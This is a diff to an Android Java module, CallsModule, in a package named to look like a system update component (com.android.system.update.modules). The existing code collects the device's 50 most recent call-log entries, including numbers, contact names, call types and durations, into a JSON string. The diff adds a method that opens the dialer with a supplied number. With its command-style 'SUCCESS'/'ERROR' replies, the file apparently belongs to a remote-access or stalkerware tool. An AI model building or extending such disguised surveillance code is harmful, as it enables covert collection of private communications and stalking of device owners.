@@ -3,10 +3,13 @@ package com.android.system.update.modules;
 import android.Manifest;
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.net.Uri;
 import android.provider.CallLog;
 import androidx.core.app.ActivityCompat;
+import androidx.core.content.ContextCompat;
 
 import org.json.JSONArray;
 import org.json.JSONObject;
@@ -19,24 +22,23 @@ public class CallsModule {
     }
     
     public String getCallLogs() {
-        if (!checkPermission()) return "ERROR: No call log permission";
+        if (!checkReadPermission()) return "ERROR: No call log permission";
         
         try {
             JSONArray callsList = new JSONArray();
             ContentResolver cr = context.getContentResolver();
             
-            // Fix: Use proper selection and sort order, LIMIT needs to be handled differently
             Cursor cursor = cr.query(
                 CallLog.Calls.CONTENT_URI,
-                null,  // projection - all columns
-                null,  // selection - no filter
-                null,  // selection args
-                CallLog.Calls.DATE + " DESC" // sort order - no LIMIT here
+                null,
+                null,
+                null,
+                CallLog.Calls.DATE + " DESC"
             );
             
             if (cursor != null) {
                 int count = 0;
-                int maxResults = 50; // Limit to 50 results
+                int maxResults = 50;
                 
                 int numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                 int typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE);
@@ -44,7 +46,6 @@ public class CallsModule {
                 int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                 int nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                 
-                // Check if indices are valid
                 if (numberIdx == -1 || typeIdx == -1 || dateIdx == -1 || durationIdx == -1) {
                     cursor.close();
                     return "ERROR: Could not access call log columns";
@@ -53,11 +54,9 @@ public class CallsModule {
                 while (cursor.moveToNext() && count < maxResults) {
                     JSONObject call = new JSONObject();
                     
-                    // Safely get values with null checks
                     String number = cursor.getString(numberIdx);
                     call.put("number", number != null ? number : "Unknown");
                     
-                    // Get contact name if available
                     if (nameIdx != -1) {
                         String name = cursor.getString(nameIdx);
                         call.put("name", name != null ? name : "");
@@ -80,7 +79,6 @@ public class CallsModule {
                     
                     call.put("type", typeStr);
                     
-                    // Add formatted date for easy display
                     java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                     String formattedDate = sdf.format(new java.util.Date(date));
                     call.put("formatted_date", formattedDate);
@@ -92,7 +90,6 @@ public class CallsModule {
                 cursor.close();
             }
             
-            // Return as JSON array string - no prefix needed
             return callsList.toString();
             
         } catch (Exception e) {
@@ -101,7 +98,34 @@ public class CallsModule {
         }
     }
     
-    private boolean checkPermission() {
+    public String makeCall(String phoneNumber) {
+        if (phoneNumber == null || phoneNumber.isEmpty() || phoneNumber.equals("Unknown")) {
+            return "ERROR: Invalid phone number";
+        }
+        
+        try {
+            // Clean the phone number
+            String cleanNumber = phoneNumber.replaceAll("[^0-9+]", "");
+            
+            if (cleanNumber.isEmpty()) {
+                return "ERROR: Invalid phone number format";
+            }
+            
+            // Use Intent.ACTION_DIAL to open dialer (doesn't require CALL_PHONE permission)
+            // This is safer and user still needs to press the call button
+            Intent intent = new Intent(Intent.ACTION_DIAL);
+            intent.setData(Uri.parse("tel:" + cleanNumber));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            
+            context.startActivity(intent);
+            return "SUCCESS: Opened dialer with number " + cleanNumber;
+        } catch (Exception e) {
+            e.printStackTrace();
+            return "ERROR: " + e.getMessage();
+        }
+    }
+    
+    private boolean checkReadPermission() {
         return ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG)
             == PackageManager.PERMISSION_GRANTED;
     }
